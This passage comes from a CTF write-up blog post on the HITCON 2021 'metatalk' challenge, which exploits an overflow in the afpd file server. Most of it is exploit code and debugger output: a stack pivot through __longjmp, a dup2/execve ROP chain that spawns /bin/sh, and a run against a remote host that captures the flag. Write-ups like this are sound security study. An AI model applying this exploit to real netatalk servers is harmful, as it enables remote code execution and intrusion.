+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x63d300</span><span class="p">)</span>							<span class="c1"># fake empty tcache arena
+</span><span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6567b0</span><span class="p">)</span>							<span class="c1"># bss pointer to not crash in dl_signal (in username)
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">4736</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">4656</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x644820</span><span class="p">)</span>							<span class="c1"># bss address for storing errno
+</span><span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>									<span class="c1"># __pointer_chk_guard_local
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">4738</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">40</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+
+<span class="n">send_dsi_package</span><span class="p">(</span><span class="n">DSIFUNC_CMD</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span></code></pre></figure>
+
+<p>The first login command will succeed and put our username (including the ropchain) into <code class="language-plaintext highlighter-rouge">obj</code> on <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6567a0 &lt;obj+512&gt;:	0x6b6c61746174656d	0x0000000000000000 &lt;= username
+0x6567b0 &lt;obj+528&gt;:	0x0000000000640000	0x0000000000640000 &lt;= fake addresses for dl_signal (errno)
+0x6567c0 &lt;obj+544&gt;:	0x0000000000000000	0x0000000000000000
+0x6567d0 &lt;obj+560&gt;:	0x0000000000000000	0x0000000000000000
+0x6567e0 &lt;obj+576&gt;:	0x0000000000000000	0x0000000000000000
+0x6567f0 &lt;obj+592&gt;:	0x0000000000000000	0x00000000deadbeef
+0x656800 &lt;obj+608&gt;:	0x0000000000000000	0x0000000000000000
+0x656810 &lt;obj+624&gt;:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Also updated the overflow payload to set <code class="language-plaintext highlighter-rouge">__pointer_chk_guard_local</code> to <code class="language-plaintext highlighter-rouge">0</code>, so the <code class="language-plaintext highlighter-rouge">xor</code> will just do nothing. Changed the bss pointer to now point into our username and put two valid addresses there for dereferencing in <code class="language-plaintext highlighter-rouge">dl_signal</code> and thus our username will now be used in <code class="language-plaintext highlighter-rouge">__longjmp</code> for setting up the stack.</p>
+
+<p>We only have to take care of the <code class="language-plaintext highlighter-rouge">rol r8, 0x11</code> and <code class="language-plaintext highlighter-rouge">rol rdx, 0x11</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">rol = lambda val, r_bits, max_bits: \
+	(val &lt;&lt; r_bits%max_bits) &amp; (2**max_bits-1) | \
+	((val &amp; (2**max_bits-1)) &gt;&gt; (max_bits-(r_bits%max_bits)))
+
+user = "metatalk" + p64(0x0)
+user += p64(0x0000000000640000) + p64(0x0000000000640000)          # put valid address here for dl_signal
+user += p64(0x0) + p64(0)
+user += p64(0x0) + p64(0)
+user += p64(0x0) + p64(0)
+user += p64(0x0) + p64(rol(0xdeadbeef, 0x11, 64))</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1               
+$rbx   : 0x0               
+$rcx   : 0x0000000001d03670  →  "symbol strerror version GLIBC_2.2.5 not defined in[...]"
+$rdx   : 0xdeadbeef        
+$rsp   : 0x0               
+$rbp   : 0x0               
+$rsi   : 0x1               
+$rdi   : 0x00000000006567c0  →  0x0000000000000000
+$rip   : 0xdeadbeef        
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007f7612ee369f  →  0x706e203d3d206900
+$r11   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r12   : 0x0               
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+[!] Unmapped address: '0x0'
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0xdeadbeef
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ───</code></pre></figure>
+
+<p>Ok, <code class="language-plaintext highlighter-rouge">rip</code> control, now just fixup <code class="language-plaintext highlighter-rouge">rsp</code> and put a <code class="language-plaintext highlighter-rouge">ret</code> gadget into <code class="language-plaintext highlighter-rouge">rdx</code> to get ropping.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">RET</span> <span class="o">=</span> <span class="mh">0x00000000004002e1</span>
+
+<span class="n">user</span> <span class="o">=</span> <span class="s">"metatalk"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span>          <span class="c1"># put valid address here for dl_signal
+</span><span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="mh">0x656800</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">RET</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">))</span>     <span class="c1"># rsp / rdx
+</span><span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1               
+$rbx   : 0x0               
+$rcx   : 0x0000000001d04f10  →  "symbol strerror version GLIBC_2.2.5 not defined in[...]"
+$rdx   : 0x00000000004002e1  →   ret 
+$rsp   : 0x0000000000656800  →  0x00000000cafebabe
+$rbp   : 0x0               
+$rsi   : 0x1               
+$rdi   : 0x00000000006567c0  →  0x0000000000000000
+$rip   : 0x00007f761246fdd0  →  &lt;__longjmp+80&gt; jmp rdx
+$r8    : 0x0000000000656800  →  0x00000000cafebabe
+$r9    : 0x0               
+$r10   : 0x00007f7612ee369f  →  0x706e203d3d206900
+$r11   : 0x00007f76130e8000  →  0x00007f7612c45000  →  0x00010102464c457f
+$r12   : 0x0               
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x0000000000656800│+0x0000: 0x00000000cafebabe	 ← $rsp, $r8
+0x0000000000656808│+0x0008: 0x0000000000000000
+0x0000000000656810│+0x0010: 0x0000000000000000
+0x0000000000656818│+0x0018: 0x0000000000000000
+0x0000000000656820│+0x0020: 0x0000000000000000
+0x0000000000656828│+0x0028: 0x0000000000000000
+0x0000000000656830│+0x0030: 0x0000000000000000
+0x0000000000656838│+0x0038: 0x0000000000000000
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f761246fdc9 &lt;__longjmp+73&gt;   mov    rsp, r8
+   0x7f761246fdcc &lt;__longjmp+76&gt;   mov    rbp, r9
+   0x7f761246fdcf &lt;__longjmp+79&gt;   nop    
+ → 0x7f761246fdd0 &lt;__longjmp+80&gt;   jmp    rdx
+   0x7f761246fdd2                  nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x7f761246fddc                  nop    DWORD PTR [rax+0x0]
+   0x7f761246fde0 &lt;_longjmp_unwind+0&gt; mov    eax, DWORD PTR [rip+0x3b1be2]        # 0x7f76128219c8 &lt;__libc_pthread_functions_init&gt;
+   0x7f761246fde6 &lt;_longjmp_unwind+6&gt; test   eax, eax
+   0x7f761246fde8 &lt;_longjmp_unwind+8&gt; je     0x7f761246fe08 &lt;_longjmp_unwind+40&gt;</code></pre></figure>
+
+<p>Stack prepared, <code class="language-plaintext highlighter-rouge">rdx</code> pointing to ret. Well, that was a lot easier than my ctf approach (facepalm)</p>
+
+<p>Now, we just have to put a <code class="language-plaintext highlighter-rouge">dup2/execve</code> ropchain there</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">RET</span> <span class="o">=</span> <span class="mh">0x00000000004002e1</span>
+
+<span class="n">SOCKET</span> <span class="o">=</span> <span class="mi">6</span>
+
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="mh">0x000000000040c2fc</span>
+<span class="n">POPRDI</span> <span class="o">=</span> <span class="mh">0x00000000004096ab</span>
+<span class="n">POPRDXRBX</span> <span class="o">=</span> <span class="mh">0x00000000004298c7</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x000000000042245d</span>
+
+<span class="n">user</span> <span class="o">=</span> <span class="s">"metatalk"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000640000</span><span class="p">)</span>          <span class="c1"># put valid address here for dl_signal
+</span><span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="mh">0x656800</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">RET</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">))</span>     <span class="c1"># rsp / rdx
+</span>	
+<span class="c1"># ropchain starts here	
+</span><span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SOCKET</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">])</span>	
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SOCKET</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">])</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>	
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x656890</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDXRBX</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"execl"</span><span class="p">])</span>
+
+<span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/kileak/ctf/hit21/meta/metatalk/share/afpd'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    FORTIFY:  Enabled
+[+] Opening connection to 18.181.73.12 on port 4869: Done
+[+] Starting local process './pow.sh': pid 62988
+[*] Open session
+[*] Do valid login to prepare ropchain on bss
+[*] Overflow package data
+[*] Switching to interactive mode
+\x00\xff\xff�w\x0\x00\x00\x00\x00\x00\x00\xa3��\x8d,\x94����z#~��\xb2\x07\x163\x1e\xaek    \xac\xbe\xbb\xa3բ)\x89\xff\x0fK��ɾ[p\x10\xaa\x857$\xbe:4\x9df�T΃^\xff?\xb9P���\x8e-G�R��Dv\xb8��\xabzJ\xb0b\xb1\x0c�G\xa9rٲ\xbe����ϥg\xae$\x18+\xa5\x87\x0b\�T�l\xbap\xb8j\x87k-�]]\x9a\xaf\�m�-�&gt;](\x04j��f��ZDw��S\x07)� &amp;_\x9f\x051\xae�#\x93\x93آ\x99LW��59W)-\xbab\xb7\xb4��O\x0c!�Qs\xab������O\xa2"\x15@�4��\xb2\x9c��\x85m\x07    �u��f�\x06ˢ\x18\x89.\x1b�J�U�ls
+$ cd home/metatalk
+$ ls
+afp.conf
+afpd
+libatalk.so.18
+m3ta_fl4g
+uams_dhx.so
+uams_dhx2.so
+$ cat m3ta_fl4g
+hitcon{m3tatalk_1s_A_n4xt_g3n3r4ti0n_b4ckd00r}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=hitcon CTF 2021 - metatalk&amp;url=https://kileak.github.io/ctf/2021/hitcon21-metatalk/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/hitcon21-metatalk/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/hitcon21-metatalk';
+        var disqus_title = 'hitcon CTF 2021 - metatalk';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/hitcon21-metatalk';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
